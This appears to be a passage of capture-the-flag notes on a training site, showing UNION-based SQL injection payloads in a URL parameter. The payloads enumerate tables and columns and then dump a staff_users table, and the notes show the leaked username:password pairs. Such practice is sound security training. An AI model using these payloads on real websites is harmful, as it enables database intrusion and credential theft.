
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

### 2

Article ID: 1

article,staff_users

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

### 2

Article ID: 1

id,username,password

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

### 2

Article ID: 1

admin:p4ssword  
martin:pa$$word  
jim:work123